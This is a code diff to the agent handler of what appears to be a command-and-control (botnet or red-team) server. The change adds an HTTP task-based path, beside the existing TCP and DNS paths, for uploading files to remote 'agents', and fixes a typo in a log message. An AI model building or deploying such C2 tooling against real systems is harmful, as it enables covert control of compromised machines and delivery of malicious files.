@@ -477,17 +477,19 @@ class Handler(threading.Thread):
             self.beacon_wait = False
             return False
 
-        # Encode file for upload
-        print(f"[* BotHandler-Msg:Upload] Encoding {localfile} to send to agent {self.getID()}")
-        self.loggers[0].q_log('serv','info','[* BotHandler-Msg:Upload] Encoding '+str(localfile)+' to send to agent '+str(self.getID()))
-        b64filedata = base64.b64encode(filedata).decode('utf-8')
-        b64datalen = len(b64filedata)
+        if self.transport_type == "TCP" or self.transport_type == "DNS":
+            # Encode file for upload
+            print(f"[* BotHandler-Msg:Upload] Encoding {localfile} to send to agent {self.getID()}")
+            self.loggers[0].q_log('serv','info','[* BotHandler-Msg:Upload] Encoding '+str(localfile)+' to send to agent '+str(self.getID()))
+            b64filedata = base64.b64encode(filedata).decode('utf-8')
+            b64datalen = len(b64filedata)
             
         # This will send following data to agent:
         # upload <remote-filename> <b64_size>
 
         try:
-            self.execute('upload {} {}'.format(remotefile,b64datalen))
+            if self.transport_type == "TCP" or self.transport_type == "DNS":
+                self.execute('upload {} {}'.format(remotefile,b64datalen))
         except Exception as ex:
             print(f"[* BotHandler-Msg:Upload] Unable to send 'upload' initiation to agent {str(self.getID())}")
             self.loggers[0].q_log('serv','info','[* BotHandler-Msg:Upload] Unable to send \'upload\' initiation to agent '+str(self.getID()))
@@ -500,11 +502,23 @@ class Handler(threading.Thread):
             
             # This will then send the file contents to the agent as its expecting
             try:
-                time.sleep(0.7)
-                print(f"[* BotHandler-Msg:Upload] Attempting to send base64 encoded filedata of {localfile} to remote file {remotefile} on agent {self.getID()}")
-                self.loggers[0].q_log('serv','info','[* BotHandler-Msg:Upload] Attempting to send base64 encoded filedata of '+str(localfile)+' to remote file '+str(remotefile)+' on agent '+str(self.getID()))
-                self.execute(b64filedata)
-                time.sleep(1.5)
+                if self.transport_type == "TCP" or self.transport_type == "DNS":
+                    time.sleep(0.7)
+                    print(f"[* BotHandler-Msg:Upload] Attempting to send base64 encoded filedata of {localfile} to remote file {remotefile} on agent {self.getID()}")
+                    self.loggers[0].q_log('serv','info','[* BotHandler-Msg:Upload] Attempting to send base64 encoded filedata of '+str(localfile)+' to remote file '+str(remotefile)+' on agent '+str(self.getID()))
+                    self.execute(b64filedata)
+                    time.sleep(1.5)
+                elif self.transport_type == "HTTP":
+                    print(f"[* BotHandler-Msg:Upload] Attempting to send base64 encoded filedata of {localfile} to remote file {remotefile} on agent {self.getID()}")
+                    self.loggers[0].q_log('serv','info','[* BotHandler-Msg:Upload] Attempting to send base64 encoded filedata of '+str(localfile)+' to remote file '+str(remotefile)+' on agent '+str(self.getID()))
+                    ret_val = json.loads(self.execute(f'[{{"task_type":"get-file","agent_id":"{str(self.getID())}","filename":"{str(localfile)}","save_as":"{str(remotefile)}"}}]'))
+                    # Retrieve task_id key from results to print the returned content (The task_id is the key for contents in the current JSON formatting)
+                    res_task_id = [key for key in ret_val.keys() if key != "agent_id" and key != "_id" and key != "result_id"]
+                    if ret_val[res_task_id[0]]['success'] == "true":
+                        print(f"[* BotHandler-Msg:Upload] Upload  of file {localfile} to remote file {remotefile} on agent {self.getID()} determined successful.")
+                        self.loggers[0].q_log('serv','info','[* BotHandler-Msg:Upload] Upload of '+str(localfile)+' to remote file '+str(remotefile)+' on agent '+str(self.getID())+' determined successful.')
+                        self.beacon_wait = False
+                        return True
             except Exception as ex:
                 print(f"[* BotHandler-Msg:Upload] Unable to send encoded local file data to agent {str(self.getID())}")
                 self.loggers[0].q_log('serv','info','[* BotHandler-Msg:Upload] Unable to send encoded local file data to agent '+str(self.getID()))
@@ -513,6 +527,6 @@ class Handler(threading.Thread):
                 return False
         
         print(f"[* BotHandler-Msg:Upload] Upload  of file {localfile} to remote file {remotefile} on agent {self.getID()} determined successful. Please verify with agent.")
-        self.loggers[0].q_log('serv','info','[* BotHandler-Msg:Upload] Upload of '+str(localfile)+' to remote file '+str(remotefile)+' on agent '+str(self.getID())+' determined successfule. Please verify with agent.')
+        self.loggers[0].q_log('serv','info','[* BotHandler-Msg:Upload] Upload of '+str(localfile)+' to remote file '+str(remotefile)+' on agent '+str(self.getID())+' determined successful. Please verify with agent.')
         self.beacon_wait = False
         return True
